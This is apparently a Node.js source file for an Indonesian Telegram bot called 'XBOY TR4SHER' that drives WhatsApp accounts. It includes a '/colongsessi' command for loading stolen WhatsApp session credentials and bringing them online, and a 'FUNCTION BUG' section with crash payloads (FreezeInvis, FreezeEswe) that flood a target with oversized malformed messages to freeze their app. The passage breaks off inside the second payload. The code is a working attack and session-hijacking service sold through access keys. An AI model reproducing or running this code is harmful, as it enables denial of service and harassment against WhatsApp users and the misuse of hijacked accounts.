const { Telegraf } = require("telegraf");
const AdmZip = require('adm-zip'); // Tambahkan modul ini

const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";
const fse = require("fs-extra");
const fs = require("fs");
const os = require("os");
const { exec } = require('child_process'); // Tambahkan modul ini
let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const userPath = path.join(__dirname, "./database/user.json");
app.use(express.static(path.join(__dirname, "public")));

app.use('/img', express.static(path.join(__dirname, 'img')));

app.use(cookieParser());

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('@whiskeysockets/baileys');

let Ren;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  return dir;
};

// Helper untuk cari creds.json - HAPUS DUPLIKASI
async function findCredsFile(dir) {
  const files = fs.readdirSync(dir, { withFileTypes: true });
  for (const file of files) {
    const fullPath = path.join(dir, file.name);
    if (file.isDirectory()) {
      const result = await findCredsFile(fullPath);
      if (result) return result;
    } else if (file.name === "creds.json") {
      return fullPath;
    }
  }
  return null;
}

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    Ren = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, Ren);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      Ren.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  Ren = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  Ren.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, Ren);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Ren.requestPairingCode(BotNumber);
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  Ren.ev.on("creds.update", saveCreds);
  return Ren;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});

console.clear();
console.log(chalk.red(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣛⣛⠛⠛⡛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣠⠶⢛⣋⣿⠿⠷⠒⠾⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣨⣴⠿⢛⣛⣭⡧⢚⣛⢿⣦⡙⢿⣷⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⣠⣾⢛⣥⣾⠟⣩⣤⣄⣘⡛⢷⣌⠻⣮⢻⣷⡀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡄⠀⣴⠟⣡⣾⡟⣱⣿⢩⡿⣿⡿⢻⢊⢻⣧⡙⡜⣿⡄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡔⢀⣼⠏⣰⣿⠌⢰⣿⠋⣾⣿⠇⠸⣦⢧⡀⢻⣷⣴⡘⣿⡄⠹⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠁⣾⡏⣰⣿⠟⠀⠠⡅⠠⠥⠀⢠⣧⠙⠈⢷⠀⢻⡿⢡⠘⣧⠀⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢰⡿⢀⣿⡇⠀⠀⠀⠀⢀⠉⢀⣾⣿⣷⡀⠈⠀⠈⣋⠈⠂⠸⠀⡸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣿⠇⠸⡏⠀⡀⠁⠒⠀⣀⣴⡟⠯⢭⣿⣿⠆⠀⡼⣽⡇⠀⠀⠀⣱⠘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠛⠀⠀⠀⢰⣿⣥⣶⣸⣿⣿⣦⡆⢀⢈⣙⢀⣦⡇⡟⠁⠀⠀⠀⠏⣰⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠿⠀⠀⠰⠀⠘⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣷⠟⣡⣿⠏⠉⠀⠀⢘⣠⣠⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣦⠠⡄⠀⠆⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⡀⠀⠁⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠀⠀⠀⠀⢠⣦⡙⢿⣿⣿⣿⠿⢛⡡⡰⢠⡃⢀⠀⠸⢶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⢿⣿⣿⣿⢿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠙⢃⠀⣬⠉⣠⣴⠟⠠⠶⠿⠛⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣏⣭⣶⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣶⡜⢛⣵⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿
⣿⡿⠷⢨⣿⠏⠁⢀⡀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠈⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿
⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠄⠉⠀⢀⠀⠀⡒⠒⠻⠹⣫⣓⡲⣶⡤⣤⣀⠀⠀⠀⠀⠀⢰⢿⣧⣀⢴⣦⡀⠀⢸⣿⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠈⠘⠃⠁⠀⢄⣀⣀⡒⠒⠁⠂⠀⣼⣿⢟⣠⡟⠀⠀⠀⣿⣿
⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠜⣡⣴⣯⣽⡒⠦⣤⣤⣀⠀⠀⠀⠀⠈⠉⠉⠙⠉⠁⠀⠀⠀⠉⠃⠾⠿⠃⠀⠀⠀⠸⣿
⣿⡀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣦⡈⠉⠛⠛⠛⣛⣓⣶⣶⡒⠢⢤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⣿⡇⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⣿⣿⣷⠀⠀⠀⠀⠀⠘⣿⡿⣿⣿⣿⣿⣿⣿⡿⣿⣿⢸⣿⣿⣿⣿⡇⠀⢸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻
⣿⣿⣿⣧⡀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠟⣱⣿⣿⡌⣿⣿⣿⣿⣷⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⣿⣿⣿⣿⣿⣦⣄⣀⣀⣠⢵⣤⣉⣉⣩⣴⣾⣿⣿⣿⣷⡈⠻⣿⣿⣿⣿⣾⡿⠛⣰⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⣉⣉⣉⣁⣶⣾⡿⢡⣾⣄⠀⠀⠀⠀⠀⠀⠀⠀⣰
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢸⣿⣿⣦⡀⠀⠀⠀⠀⠀⣴⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿⣦⣤⣤⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⢀⡎⣰⣜⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⡀⢈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⢁⢀⣿⢸⠟⣨⡻⣶⣍⣙⣛⠿⠿⠿⠿⠿⠿⠿⢛⣉⣄⣴⡄⣿⣎⢆⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⢡⠁⣸⠇⣾⣼⣿⣿⣶⡭⣙⣻⠿⠿⠿⣿⣿⠿⠿⠟⣋⣅⢿⣷⢸⣿⡄⢄⠻⣿⣿⣿⣿⣿⣿⣿⣿

`));

bot.launch();
console.log(chalk.red(`
╭─☐ XBOY TR4SHER
├─ ID OWN : ${OwnerId}
├─ BOT : RUNNING... ✅
╰───────────────────`));
initializeWhatsAppConnections();

// ===== Path file =====
const configsPath = path.join(__dirname, "config.js");
const aksessPath = path.join(__dirname, "akses.json");
const adminsPath = path.join(__dirname, "database", "admin.json");

// ===== Fungsi baca JSON / JS dengan aman =====
function safeReadJSON(filePath, isJS = false) {
  try {
    if (isJS) {
      // jika file JS module.exports
      return require(filePath);
    }
    const raw = fs.readFileSync(filePath, "utf8");
    return JSON.parse(raw);
  } catch (err) {
    console.error(`❌ Gagal membaca file ${filePath}:`, err);
    return null;
  }
}

// ===== Cek owner =====
function isOwner(userId) {
  const configData = safeReadJSON(configsPath, true);
  const aksesData = safeReadJSON(aksessPath, false);

  // Ambil owners dari config.js / akses.json
  let ownersConfig = [];
  if (Array.isArray(configData?.owner)) {
    ownersConfig = configData.owner.map(Number);
  } else if (configData?.owner) {
    ownersConfig = [Number(configData.owner)];
  }

  const ownersAkses = Array.isArray(aksesData?.owners) ? aksesData.owners.map(Number) : [];

  // Cek ID user di salah satu file
  return ownersConfig.includes(Number(userId)) || ownersAkses.includes(Number(userId));
}

// ===== Cek akses =====
function isAkses(userId) {
  const data = safeReadJSON(aksessPath);
  return Array.isArray(data?.akses) && data.akses.includes(Number(userId));
}

// ===== Cek admin =====
function isAdmin(userId) {
  const adminData = safeReadJSON(adminsPath);
  return Array.isArray(adminData) && adminData.includes(Number(userId));
}

// ===== Permission helper =====
function hasPermission(userId) {
  try {
    return isOwner(userId) || isAkses(userId) || isAdmin(userId);
  } catch {
    return false;
  }
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.command("start", async (ctx) => {
  try {
    // URL gambar atau path lokal
    const imagePath = path.join(__dirname, "img", "menu.jpg"); // pastikan filenya ada
    const userName = ctx.from.first_name || "Pengguna";

    const welcomeText = `
<blockquote><pre>⬡═―—⊱ ⎧ XBOY TR4SHER ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Developer: @RmboXcrash
⌑ Version: 1.0
⌑ Prefix: / ( slash )
⌑ Language: javaScript
╘═——————————————═⬡

<blockquote><pre>⬡═―—⊱ ⎧ 𝐂𝚯𝐍𝐓𝐑𝚯𝐋𝐒 𝐌𝐄𝐍𝐔 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ /connect - Add Sender Number
⌑ /listsender - Jumlah Sender
⌑ /delsender - Deleted Sender
⌑ /colongsessi - Maling Sessions
⌑ /addakses - Add Akses User
⌑ /delakzes - Deleted Akses User
⌑ /addowner - Add Akses Owner
⌑ /delowner - Deleted Owner Akses
⌑ /cakun - Create Akun
⌑ /listakun - Jumlah Akun
⌑ /delakun - Deleted Akun
╘═——————————————═⬡
`;

    // Kirim foto beserta caption
    await ctx.replyWithPhoto(
      { source: imagePath },
      {
        caption: welcomeText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⌜📡⌟ ☇ 情報", url: "https://t.me/roompublicrembo" }
            ],
            [
              { text: "⌜👤⌟ ☇ 開発者", url: "https://t.me/RmboXcrash" }
            ]
          ]
        }
      }
    );
  } catch (err) {
    console.error("❌ Error command /start:", err);
    ctx.reply("⚠️ Terjadi kesalahan saat menampilkan start message.");
  }
});

bot.command("connect", async (ctx) => {
  if (!hasPermission(ctx.from.id)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

// ========= COLONG SESI ============
bot.command("colongsessi", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) {
    return ctx.reply("❌ Hanya owner yang bisa menggunakan perintah ini.");
  }

  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.document) {
    return ctx.reply("❌ Balas file session dengan `/add`");
  }

  const doc = reply.document;
  const name = doc.file_name.toLowerCase();
  if (![".json", ".zip", ".tar", ".tar.gz", ".tgz"].some(ext => name.endsWith(ext))) {
    return ctx.reply("❌ File bukan session yang valid (.json/.zip/.tar/.tgz)");
  }

  await ctx.reply("🔄 Memproses session…");

  try {
    const link = await ctx.telegram.getFileLink(doc.file_id);
    const { data } = await axios.get(link.href, { responseType: "arraybuffer" });
    const buf = Buffer.from(data);
    const tmp = await fse.mkdtemp(path.join(os.tmpdir(), "sess-"));

    if (name.endsWith(".json")) {
      await fse.writeFile(path.join(tmp, "creds.json"), buf);
    } else if (name.endsWith(".zip")) {
      new AdmZip(buf).extractAllTo(tmp, true);
    } else {
      const tmpTar = path.join(tmp, name);
      await fse.writeFile(tmpTar, buf);
      await tar.x({ file: tmpTar, cwd: tmp });
    }

    const credsPath = await findCredsFile(tmp);
    if (!credsPath) {
      return ctx.reply("❌ creds.json tidak ditemukan di dalam file.");
    }

    const creds = await fse.readJson(credsPath);
    const botNumber = creds.me.id.split(":")[0];
    const destDir = sessionPath(botNumber);

    await fse.remove(destDir);
    await fse.copy(tmp, destDir);
    saveActive(botNumber);

    await connectToWhatsApp(botNumber, ctx.chat.id, ctx);

    return ctx.reply(`✅ Session *${botNumber}* berhasil ditambahkan & online.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error add session:", err);
    return ctx.reply(`❌ Gagal memproses session.\nError: ${err.message}`);
  }
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
  }
});

bot.command("cakun", async (ctx) => {
  try {
    if (!hasPermission(ctx.from.id)) {
      return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args || !args.includes(",")) {
      return ctx.reply(
        "❗ Format salah.\n" +
        "Contoh: 1. `/cakun Rembo,30d`\n" +
        "Contoh: 2. `/cakun Rembo,30d,<admin/vip/owner>`\n" +
        "_username_,_durasi_[,_role_]",
        { parse_mode: "Markdown" }
      );
    }

    const [usernameRaw, durasiStrRaw, roleRaw] = args.split(",");
    const username = usernameRaw.trim();
    const durasiStr = durasiStrRaw.trim();
    const role = (roleRaw || "user").trim().toLowerCase();

    const durationMs = parseDuration(durasiStr);
    if (!durationMs) {
      return ctx.reply("❌ Format durasi salah!\nGunakan contoh: 1d");
    }

    const key = generateKey(4);
    const expired = Date.now() + durationMs;

    const users = getUsers();
    const userIndex = users.findIndex(u => u.username === username);

    if (userIndex !== -1) {
      users[userIndex] = { ...users[userIndex], key, expired, role };
    } else {
      users.push({ username, key, expired, role });
    }

    saveUsers(users);

    const expiredStr = new Date(expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });

    const apiBaseUrl = `${process.env.PROTOCOL || "http"}://${VPS}:${PORT}`;

    const msg = [
      "✅ *KEY BERHASIL DIBUAT!*",
      "",
      `📌 *Username:* \`${username}\``,
      `🔑 *Key:* \`${key}\``,
      `👤 *Role:* \`${role}\``,
      `⏳ *Expired:* _${expiredStr}_ WIB`
    ].join("\n");

    await ctx.replyWithMarkdown(msg);

  } catch (err) {
    console.error("❌ Error saat membuat key:", err);
    ctx.reply("⚠️ Terjadi kesalahan saat membuat key. Silakan coba lagi.");
  }
})

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');

  if (!fs.existsSync(filePath)) return [];

  try {
    const rawData = fs.readFileSync(filePath, 'utf-8');
    const parsed = JSON.parse(rawData);

    let users = [];

    if (Array.isArray(parsed)) {
      users = parsed;
    } else if (typeof parsed === 'object' && parsed !== null) {
      users = [parsed];
    }

    // Konversi expired ke number (kalau ada)
    return users.map(u => ({
      ...u,
      expired: u.expired ? Number(u.expired) : null
    }));
  } catch (err) {
    console.error("❌ Gagal membaca user.json:", err);
    return [];
  }
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');

  const normalizedUsers = users.map(u => ({
    ...u,
    expired: u.expired ? Number(u.expired) : null
  }));

  try {
    fs.writeFileSync(filePath, JSON.stringify(normalizedUsers, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

bot.command("listakun", (ctx) => {
  if (!hasPermission(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const users = getUsers();
  if (users.length === 0) return ctx.reply("📭 Belum ada key yang dibuat.");

  let teks = `📜 *Daftar Key Aktif:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});


bot.command("delakun", (ctx) => {
  if (!hasPermission(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const username = ctx.message.text.split(" ")[1];
  if (!username) return ctx.reply("❗ Masukkan username!\nContoh: /delakun vinz");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username \`${username}\` tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);

  ctx.reply(`🗑️ Akun milik *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addakses", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa tambah akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addakses <user_id>");

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User sudah punya akses.");
  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Akses diberikan ke ID: ${id}`);
});

bot.command("delakses", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa hapus akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delakses <user_id>");

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User tidak ditemukan.");
  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Akses user ID ${id} dihapus.`);
});

bot.command("addowner", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa tambah owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addowner <user_id>");

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✅ Sudah owner.");
  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`👑 Owner baru ditambahkan: ${id}`);
});

bot.command("delowner", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Hanya owner yang bisa hapus owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delowner <user_id>");

  const data = loadAkses();
  if (!data.owners.includes(id)) return ctx.reply("❌ Bukan owner.");
  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Owner ID ${id} berhasil dihapus.`);
});

//FUNGSI JEDA
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ========== FUNCTION BUG ============ \\
async function FreezeInvis(Ren, target) {
 await Ren.relayMessage("status@broadcast", {
    interactiveResponseMessage: {
      body: {
        text: "\u0000" + "ꦽ".repeat(55000),
        format: "DEFAULT"
      },
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
          "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Nted - Ex3cute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Xcrasher - Nted\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"NtedExecuteV1St\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }, { userJid: target });
}

async function FreezeEswe(Ren, target) {
const msg = {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "FyzzNewEraa 🦋." + "ꦽ".repeat(250),
format: "DEFAULT",
